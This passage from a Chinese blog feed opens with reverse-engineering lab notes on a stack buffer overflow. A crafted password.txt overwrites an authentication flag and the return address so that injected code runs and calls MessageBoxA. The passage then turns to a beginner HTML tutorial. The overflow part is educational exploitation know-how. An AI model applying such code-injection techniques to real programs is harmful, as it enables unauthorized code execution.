<li><p>如果在<code>password.txt</code>中写入恰好44个字符，那么第45个隐藏的截断符<code>null</code>将冲掉<code>authenticaed</code>低字节中的1，从而突破密码验证的限制。我们不妨就用44个字节作为输入来进行动态调试。</p>
</li>
<li><p>出于字节对齐、容易辨认的目的，我们把<code>4321</code>作为个输入单元。</p>
<p><code>buffer[44]</code>共需要11个这样的单元，第12个输入单元将<code>athenticated</code>覆盖；第13个输入单元将前栈帧EBP值覆盖；第14个输入单元将返回地址覆盖。则共需要11组<code>4321</code>，共44个字符，应该就可以绕过验证返回正确消息。此时栈的状态如图2.4.4和表2-4-2。</p>
</li>
</ul>
<p><img data-src="https://i.loli.net/2021/02/03/v1nx7QpDSfsdGLy.png" alt="25.png"></p>
<p><img data-src="https://i.loli.net/2021/02/03/kKBzJ514Nme8Lra.png" alt="26.png"></p>
</li>
<li><p>动态调试的结果证明了前边分析的正确性。我们可以得到以下信息。</p>
<ul>
<li><p><code>buffer</code>数组的起始地址为<code>0x0012FAF0</code>。该该地址靠近栈顶，存放<code>buffer[0]</code>， 此时ESP指针为 <code>0x0012FA9C</code> ；</p>
</li>
<li><p><code> password.txt</code>文件中第53~ 56个字符的 ASCII 码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址。（0-44 -&gt; buffer，45-48-&gt; athenticated，49-52 -&gt; ebp，53-56 -&gt; 返回地址）</p>
</li>
<li><p>也就是说，将<code>buffer</code>的起始地址<code>0x0012FAF0</code>写入<code>password.txt</code>文件中的第<code>53~56</code>个字节，在<code>verify password</code>函数返回时会跳到我们输入的字串开始取指执行。</p>
</li>
</ul>
</li>
<li><p>下面还需要给<code>password.txt</code>中植入机器代码。让程序弹出一个消息框只需要调用<code>Windows</code>的 API 函数<code>MessageBox</code>。MSDN 对这个函数的解释如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HwND hWnd，</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR IpText,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hWnd [in]</code> 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口。</li>
<li><code>lpTex[in]</code> 字符串指针，所指字符串会在消息框中显示。</li>
<li><code>lpCaption [in]</code> 字符串指针，所指字符串将成为消息框的标题。</li>
<li><code>uType [in]</code> 消息框的风格（单按钮、多按钮等），NULL代表默认风格。</li>
</ul>
</li>
<li><p>我们将给出调用这个API的汇编代码，然后翻译成机器代码，用十六进制编辑工具填入<code>password.txt</code>文件。 </p>
<p>用汇编语言调用<code>MessageboxA</code>需要3个步骤：</p>
<p>（1）装载动态链接库<code>user32.dll</code>。 MessageBoxA 是动态链接库user32.dll的导出函数。虽然大多数有图形化操作界面的程序都已经装载了这个库，本实验已预先手动加载了它。</p>
<p>（2）在汇编语言中调用这个函数需要获得这个函数的入口地址。</p>
<p>（3）在调用前需要向栈中按从右向左的顺序压入MessageBoxA的4个参数。</p>
<p><strong>MessageBoxA的入口参数可以通过user32.dll在系统中加载的基址和MessageBoxA在库中的偏移相加得到。</strong></p>
<p><img data-src="https://i.loli.net/2021/02/04/KwUVIAzortPGu4W.png" alt="27.png"></p>
<blockquote>
<p>题外话：熟悉MFC的程序员一定知道，其实系统中并不存在真正的MessagBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数( ASCII)或者“W”类函数( UNICODE)调用。因此，我们在汇编语言中调用的函数应该是MessageBoxA。 多说一句，其实MessageBoxA的实现只是在设置了 几个不常用参数后直接调用MessageBoxExA。</p>
</blockquote>
</li>
<li><p>将上述汇编指令对应的机器代码以十六进制形式逐字写入<code>password.txt</code>，第53~ 56字节填入<code>buffer</code>的起址<code>0x0012FAF0</code>，其余的字节用<code>0x90</code>（nop指令）填充。</p>
<p><img data-src="https://i.loli.net/2021/02/04/x2SGDJ7OE583Wye.png" alt="28.png"></p>
<div class="note success"><p>因为MessageBoxA 调用的代码执行完成后，没有写用于安全退出的代码的缘故。在植入代码中没有安全地退出，程序会崩溃。<mark class="label success">所以应该在植入代码中安全地退出程序，甚至在植入代码结束后修复堆栈和寄存器，让程序重新回到正常的执行流程</mark>。</p>
</div></li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML-基础</title>
    <url>/post/HTML-basics/</url>
    <content><![CDATA[<p>使用HTML标记实际上也就是使用标签和其属性 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>HTML 基础</font> </center>






<br>

<br>

<h3 id="一-HTML-初识"><a href="#一-HTML-初识" class="headerlink" title="一. HTML 初识"></a><font color="#FF6347" face="Comic sans MS">一. HTML 初识</font></h3><p>当您保存 HTML 文件时，既可以使用 .htm 也可以使用 .html 扩展名。两者没有区别，完全根据您的喜好。</p>
<br>

<p><strong>HTML标签编写规范</strong></p>
<p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p>
<p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p>
<p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p>
<p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层。</p>
<br>

<p><font color="#00B2EE"><strong>HTML，Hypertext Markup Language ,超文本标注语言。</strong></font>HTML是一种规范，是一种标准，编写网页的一种标准。<br><font color="#00B2EE"></font></p>
<ul>
<li><strong>超文本：</strong>就是网页上不光有文本，还有图片、音乐、视频等。</li>
<li><strong>标注：</strong>是一种记号，是一种标志。如：红绿灯</li>
<li><strong>语言：</strong>这里的“语言”就是代码，跟所谓“程序语言”一点关系都没有。</li>
</ul>
<p><strong>HTML的主要目的：</strong><font color="#FF7F00"><strong>就是用来显示网页的不同效果、不同部分。如：<code>&lt;b&gt;文本&lt;/b&gt;</code></strong></font></p>
<br>

<br>

<h4 id="1-1-HTML文件结构"><a href="#1-1-HTML文件结构" class="headerlink" title="1.1 HTML文件结构"></a><font color="#3CB371" face="Comic sans MS">1.1 HTML文件结构</font></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;php.cn&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">这里是存放网页内容的</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>


<p><strong>HTML 页面整体构成</strong><br>用浏览器打开任意一个网页，右键选择查看网页源码，就可以看到网站的HTML代码，总结一下，整体结构如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c823abe1bb83.png" alt=" 1.png"></p>
<p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、HTML文件结构的说明：</strong></font></p>
<ul>
<li><p><strong><code>&lt;!DOCTYPE HTML&gt;</code>：</strong>html5标准网页声明，<font color="#FF7F00"><strong>必须放在 HTML 文档的第一行</strong></font>，位于<code>&lt;html&gt;</code>标签之前。声明有助于浏览器中正确显示网页。</p>
</li>
<li><p><strong><code>&lt;html&gt;&lt;/html&gt;</code>：</strong>告诉浏览器，其中的代码用什么格式(图片、视频)来编译。</p>
</li>
<li><p><strong><code>&lt;head&gt;&lt;/head&gt;</code>：</strong>头部中包含的标记是页面的标题、序言、说明等内容，它本身<font color="#FF7F00"><strong>不作为内容来显示</strong></font>，但影响网页显示的效果。</p>
<ol>
<li>下面<font color="#FF7F00"><strong>这些标签可用在 head 部分：<code>&lt;title&gt;</code>,<code>&lt;meta&gt;</code>,  <code>&lt;base&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code></strong></font>。</li>
<li>头部中最常用的标记符是标题标记符<code>&lt;title&gt;页面标题&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>标记符，其中标题标记符用于定义网页的标题，它的内容显示在网页窗口的标题栏中，网页标题可被浏览器用作书签和收藏清单。</li>
<li>设置文档标题和其它在网页中不显示的信息，比如direction方向、语言代码Language Code（实体定义!ENTITY % i18n）、指定字典中的元信息、等等。</li>
</ol>
</li>
<li><p><strong><code>&lt;body&gt;&lt;/body&gt;</code>：</strong>是网页主要内容的显示区域。网页中显示的实际内容均包含在这2个正文标记符之间。正文标记符又称为实体标记。网页中99%的内容都必须放在<code>&lt;body&gt;</code>。只有放在<code>&lt;body&gt;</code>中，最终浏览器翻译以后，才能看见结果。</p>
</li>
</ul>
<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、关于头部<code>&lt;head&gt;&lt;/head&gt;</code>中常用的两个标签<code>&lt;title&gt;&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>：</strong></font></p>
<ol>
<li><p><strong><code>&lt;title&gt;纯文本&lt;/title&gt;</code></strong><font color="#FF7F00"><strong>中只能是纯文本，任何标记都会原封不动的显示。</strong></font></p>
</li>
<li><p>**<code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</code>**功能：告诉浏览器，如何翻译汉字。<br> 1. <strong>http-equiv：</strong>模拟http协议的文件头原信息，主要目的是服务器向客户端返回时，用什么格式显示。<br> 2. <strong>Content-type：</strong>内容类型。<br> 3. <strong>Content：</strong>详细内容类型介绍。<br> 4. <strong>Text&#x2F;html：</strong>网页是text格式，html是文本中的小格式。<br> 5. <strong>Charset：</strong>字符集，主要控制汉字如何显示。<br> 6. <strong>Utf-8：</strong>多国语言编码，什么国家的语言都可以正常显示。</p>
</li>
</ol>
<br />

<br />

<h4 id="1-2-HTML文件组成"><a href="#1-2-HTML文件组成" class="headerlink" title="1.2 HTML文件组成"></a><font color="#3CB371" face="Comic sans MS">1.2 HTML文件组成</font></h4><blockquote>
<p><font color="#FF7F00"><strong>HTML 是什么</strong></font></p>
</blockquote>
<ol>
<li>HTML 是用来描述网页的一种语言。</li>
<li>HTML 不是一种编程语言，而是一种标记语言</li>
<li>标记语言是一套标记标签 (markup tag)</li>
<li>HTML 使用标记标签来描述网页</li>
<li>HTML 文档包含了HTML 标签及文本内容</li>
<li>HTML文档也叫做 web 页面</li>
</ol>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 标签</strong></font></p>
</blockquote>
<ol>
<li>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</li>
<li>HTML 标签是由尖括号包围的关键词，比如 <code>&lt;html&gt;</code></li>
<li>HTML 标签通常是成对出现的，比如 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code>。也有单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></li>
<li>标签对中的第一个标签是开始标签，第二个标签是结束标签</li>
<li>开始和结束标签也被称为开放标签和闭合标签</li>
<li>标签语法格式：<ol>
<li><strong>双边标签：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></li>
<li><strong>单边标签：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;</code></strong></li>
</ol>
</li>
</ol>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 元素</strong></font></p>
</blockquote>
<ol>
<li>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</li>
<li>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</li>
<li>HTML 元素:<code>&lt;p&gt;这是一个段落。&lt;/p&gt;</code></li>
</ol>
<hr size="2" color="#00B2EE" width="100%" noshade>

<ul>
<li><p>HTML元素是组成HTML文档最基本的部件，它是用标签来表现的，一般来说，“起始标签”表示元素的开始，“结束标签”表示元素的结束。</p>
</li>
<li><p>HTML元素分为“有内容的元素”和“空元素”两种。</p>
</li>
<li><p>“有内容的元素”是由起始标签、结束标签以及两者之间的元素内容组成的，其中元素内容既可以是需要显示在网页中的文字内容，也可以是其它元素。</p>
</li>
</ul>
<hr size="2" color="#00B2EE" width="100%" noshade>

<br>

<blockquote>
<p><font color="#FF7F00"><strong>HTML 元素属性</strong></font></p>
</blockquote>
<ol>
<li>HTML 标签可以拥有属性。属性提供了有关 HTML 元素的更多的信息。</li>
<li>属性总是以名称&#x2F;值对的形式出现，比如：<code>name=&quot;value&quot;</code>。</li>
<li>属性值应该始终被包括在<strong>引号内</strong>。双引号是最常用的，不过使用单引号也没有问题。</li>
</ol>
<hr size="2" color="#00B2EE" width="100%" noshade>

<ul>
<li>HTML的元素属性提供了对HTML元素的描述和控制信息，借助于元素属性，HTML网页才会展现丰富多彩且格式美观的内容。</li>
<li>例如要设置<code>&lt;p&gt;</code>元素中文字内容的颜色为红色，字号为30像素，这时就需要用到HTML元素属性了。如在<code>&lt;p&gt;</code>元素名称的尖括号内添加了<code>style=&quot;color:#ff0000;font-size:30px&quot;</code>内容，浏览器就会按照设定的效果来显示内容。</li>
</ul>
<hr size="2" color="#00B2EE" width="100%" noshade>



<br>

<br>

<h3 id="二-HTML-标签"><a href="#二-HTML-标签" class="headerlink" title="二. HTML 标签"></a><font color="#FF6347" face="Comic sans MS">二. HTML 标签</font></h3><br>


<h4 id="2-1-标签介绍"><a href="#2-1-标签介绍" class="headerlink" title="2.1 标签介绍"></a><font color="#3CB371" face="Comic sans MS">2.1 标签介绍</font></h4><p>按功能排序HTML的标签请参考：<font color="#00B2EE">《<a href="http://www.runoob.com/tags/ref-byfunc.html">HTML 标签参考手册- (HTML5 标准)</a>》</font> </p>
<p><strong>HTML标签分两类：</strong>双边标签和单边标签。</p>
<br>

<p><strong>1. 双边标签</strong></p>
<ul>
<li><p>双边标签，是指有开始和结束标签，内容放在开始和结束标签之间。如：<code>&lt;b&gt;内容&lt;/b&gt;</code></p>
</li>
<li><p>“属性”的通俗理解：一个东西总是有一些特征，重量，体积等，这就是一个东西的“属性”</p>
</li>
<li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></p>
</li>
</ul>
<br>

<p><strong>2. 单边标签</strong></p>
<ul>
<li><p>单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></p>
</li>
<li><p>单边标签一般起一个特殊的功能。</p>
</li>
<li><p>单边标签常用的有10多个标记。</p>
</li>
<li><p><strong>语法格式：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;</code></strong></p>
</li>
</ul>
<br>

<p>先来看一下双边标签例子，观察<code>&lt;font&gt;&lt;/font&gt;</code>标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;directoree.top&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1553.png&quot;</span>&gt;&gt;</span><br><span class="line">        &lt;h1&gt;第一个，哈哈哈哈&lt;/h1&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;看看我有什么特别的&lt;/font&gt;&lt;/font&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c828faaaf57d.jpg" alt="3.png"></p>
<br>

<p>再来看一下单边标签例子，观察<code>&lt;br&gt;</code>标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;treecatee.github.io&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1553.png&quot;</span>&gt;&gt;</span><br><span class="line">        &lt;h1&gt;第二个，哈哈哈哈&lt;/h1&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;再看看我有什么特别的&lt;/font&gt;</span><br><span class="line">       &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">       &lt;font size=<span class="string">&quot;6&quot;</span> color=<span class="string">&quot;red&quot;</span>&gt;再看看我有什么特别的&lt;/font&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行如下图：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c828fa9efed8.jpg" alt="4.png"></p>
<br>

<p><strong>HTML标签编写规范</strong></p>
<p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p>
<p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p>
<p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p>
<p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层，不能交叉嵌套。</p>
<br>

<hr size="2" color="#00B2EE" width="100%" noshade>
<hr size="2" color="#00B2EE" width="100%" noshade>



<br>


<h4 id="2-2-常用标签-文本"><a href="#2-2-常用标签-文本" class="headerlink" title="2.2 常用标签-文本"></a><font color="#3CB371" face="Comic sans MS">2.2 常用标签-文本</font></h4><ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;!DOCTYPE HTML&gt;</code></strong> html5标准网页声明（必须有）</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;html&gt;&lt;/html&gt;</code></strong> 声明代码格式（必须有）</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;head&gt;&lt;/head&gt;</code></strong> 文件头（必须有）<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;title&gt;&lt;/title&gt;</code></strong> 标题（必须有）</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;meta&gt;</code></strong> 元数据  …..</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;body&gt;&lt;/body&gt;</code></strong>&amp;emsp;**<code>&lt;h1&gt; - &lt;h6&gt;</code>**（必须有）</li>
<li><input disabled="" type="checkbox"> 文本标签<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;b&gt;&lt;/b&gt;</code></strong> 加粗</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;i&gt;&lt;/i&gt;</code></strong> 斜体</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;u&gt;&lt;/u&gt;</code></strong> 下划线</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;s&gt;&lt;/s&gt;</code></strong> 删除线</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong> 上标</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong> 下标</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;font&gt;&lt;/font&gt;</code></strong> 字体标记<ul>
<li><input disabled="" type="checkbox"> <strong><code>size</code></strong> 大小(1 -&gt; 7)</li>
<li><input disabled="" type="checkbox"> <strong><code>color</code></strong> 颜色</li>
<li><input disabled="" type="checkbox"> <strong><code>face</code></strong> 字体</li>
</ul>
</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;p&gt;&lt;/p&gt;</code></strong> 表示一个段落</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;br&gt;</code></strong> 换行 </li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;hr&gt;</code></strong> 段落分割线 </li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong> 定义预格式化的文本和格式代码块</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;strong&gt;</code>和<code>&lt;em&gt;</code></strong> 加粗和斜体（强调）</li>
<li><input disabled="" type="checkbox"> <strong><code>&lt;span&gt;&lt;/span&gt;</code></strong> 对文档中的行内元素进行组合</li>
</ul>
<br>

<p><font size="4" face="Microsoft YaHei"><strong>1. <code>&lt;head&gt;&lt;/head&gt;</code>头标签</strong></font></p>
<blockquote>
<p>**<code>&lt;head&gt;</code>**内的元素可包含脚本，指示浏览器在何处可以找到样式表，提供元信息等。<br>可添加到head部分的标签：<code>&lt;title&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;style&gt;</code>:</p>
</blockquote>
<ul>
<li><strong><code>&lt;title&gt;</code>：</strong>指定整个网页的标题，在浏览器最上方显示。</li>
<li><strong><code>&lt;base&gt;</code>：</strong>为页面上的所有链接规定默认地址或默认目标(target)。</li>
<li><strong><code>&lt;meta&gt;</code>：</strong>提供有关页面的基本信息。</li>
<li><strong><code>&lt;script&gt;</code>：</strong>定义客户端脚本，如JavaScript。</li>
<li><strong><code>&lt;style&gt;</code>：</strong>定义内部样式表与网页的关系。</li>
</ul>
<br>

<ol>
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;title&gt;&lt;/title&gt;</code>：标签定义文档的标题。</strong></font> <br></li>
</ol>
<pre><code> 1. title 元素在所有 HTML/XHTML 文档中都是必需的，无属性；
 4. `&lt;title&gt;纯文本&lt;/title&gt;`中间只能是纯文本；
 2. title 元素能够：
    1. 定义浏览器工具栏中的标题
    2. 提供页面被添加到收藏夹时显示的标题
    3. 显示在搜索引擎结果中的页面标题
    4. 告诉用户和搜索引擎这个网页的主要内容是什么，
    5. 搜索引擎可以通过网页标题，迅速的判断出当前网页的主题。
</code></pre>
<br>

<hr size="2" color="#00B2EE" width="100%" noshade>


<ol start="2">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;meta&gt;</code>：标签</strong></font> <br><ol>
<li><code>&lt;meta&gt;</code> 标签提供关于 HTML 文档的元数据。</li>
<li>元数据不会显示在页面上，但是对于机器是可读的。</li>
<li>典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。</li>
<li><code>&lt;meta&gt;</code> 标签始终只能位于 head 元素中。但是头部可以有多个<code>&lt;meta&gt;</code> 标签。</li>
<li>元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。</li>
<li><strong>包含属性：（有属性就必须有对应的值(content)）</strong><ol>
<li><font color="#FF7F00"><strong>content：</strong></font>必须属性。</li>
<li>定义与 http-equiv 或 name 属性相关的元信息，content中的内容其实就是各个参数的变量值。</li>
<li>变量值可以有多个，用半角逗号<code>,</code>隔开。</li>
<li><font color="#FF7F00"><strong>http-equiv：</strong></font>可选属性。可选值：</li>
<li><strong><code>content-type</code>，内容类别</strong>，用于设置页面的类别和语言字符集。编写格式<code>&lt;meta http-equiv=“content-type” context=“text/html”；charset=“gb2312”/&gt;</code>，content属性的值代表页面采用HTML代码输出，字符集为gb2312（简体中文），国际化网站开发的话，为了字符统一，建议charset采用utf-8.</li>
<li><strong><code>refresh</code>。刷新</strong>，用于设置多长时间内网页自己刷新一次，或者用一段时间自动跳转到其他页面，第一种编写格式<code>&lt;meta http-equiv=“refresh” context=“30”/&gt;</code>表示隔30秒刷新一次，第二种编写格式<code>&lt;meta http-equiv=“refresh” context=“30；url=www.google.com”/&gt;</code>，表示30秒后页面自动跳转到<a href="http://www.google.com网站/">www.google.com网站</a></li>
<li><font color="#FF7F00"><strong>name：</strong></font>可选属性。</li>
<li>用于页面的关键字和描述，是写给搜索引擎看的；</li>
<li>与之对应的属性值为content，content中的内容主要是便于搜索引擎机器人查找信息和分类信息用的。</li>
<li>主要用于描述网页的内容，用于对搜索引擎的优化，必须重点掌握。正确地设置name属性，以便搜索引擎（比如google，baidu）的搜索机器人查找，分类，搜索引擎一般都会自动查找meta值来给网页分类。name的取值(content)如下：<br> 1. **<code>keywords</code>**。即关键字，用于说明网页所包含的关键字等信息，从而提高被搜索引擎搜索到的概率。编写格式为<code>&lt;meta name=&quot;keywords&quot; content =“关键字”/&gt;</code>，content属性的值为用户所设置的具体关键字。（一般可设置多个关键字，他们之间用英文半角的逗号分开，搜索引擎都限制关键字的数量，所以关键字内容要简洁精练）<br> 2. **<code>description</code>**。中文意思为”描述”，用于描述网页的主要内容、主题等，合理设置也可以提高被搜索引擎搜索到的概率。格式为<code>&lt;meta name=&quot;description&quot; content =“对页面的描述”/&gt;</code>，content属性值为用户所设置的页面具体描述的内容，最多容纳1024个字符，但搜索引擎一边只显示约前175个字符。<br> 3. **<code>author</code>**。作者，用于设置网站作者的名称，比较专业的网站经常用到。格式为<code>&lt;meta name=&quot;author&quot; content =“作者名称”/&gt;</code></li>
</ol>
</li>
</ol>
</li>
</ol>
<p>可参读：<font color="#00B2EE">《<a href="http://www.php.cn/code/443.html">HTML &lt;head&gt; 元素</a>》</font> 、<font color="#00B2EE">《<a href="https://www.cnblogs.com/tielemao/archive/2018/05/25/9086693.html">HTML-head头部浅析</a>》</font> </p>
<br>

<p>例1：打开该网页后每隔20秒刷新一次</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;20&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;这是个展示网页hhh&lt;/h1&gt;</span><br><span class="line">        &lt;h2&gt;希望你能够在这里学的开心&lt;/h2&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>例2：打开该网页20秒后跳转到百度首页</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;2;url=http://www.baidu.com&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;                  <span class="string">&#x27;注意这里的2后是分号“;” &#x27;</span></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;跳转网页hhh&lt;/h1&gt;</span><br><span class="line">        &lt;h2&gt;希望你能够在这里学的开心&lt;/h2&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<br>

<hr size="2" color="#00B2EE" width="100%" noshade>

<ol start="3">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;base&gt;</code>：标签</strong></font> <br></li>
</ol>
<p>   <code>&lt;base&gt;</code> 标签为页面上的所有链接设置默认的地址或默认的目标（target）</p>
<br>

<ol start="4">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;link&gt;</code>：标签</strong></font> <br></li>
</ol>
<p>   <code>&lt;link&gt;</code> 标签定义文档与外部资源之间的关系。</p>
<br>

<ol start="5">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;style&gt;</code>：标签</strong></font> <br></li>
</ol>
<pre><code>`&lt;style&gt;` 标签用于为 HTML 文档定义样式信息。
</code></pre>
<br>

<ol start="6">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;script&gt;&lt;/script&gt;</code>：标签</strong></font> <br></li>
</ol>
<p>   <code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如JavaScript。</p>
<br>

<p><font size="4" face="Microsoft YaHei"><strong>2. <code>&lt;body&gt;</code>标签和标题</strong></font></p>
<p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code>标签来定义的。</p>
<p><code>body</code>用法如下：</p>
<table>
<thead>
<tr>
<th align="left">用法</th>
<th align="left">作用</th>
<th align="left">可选属性&#x2F;是否赞成使用该属性</th>
</tr>
</thead>
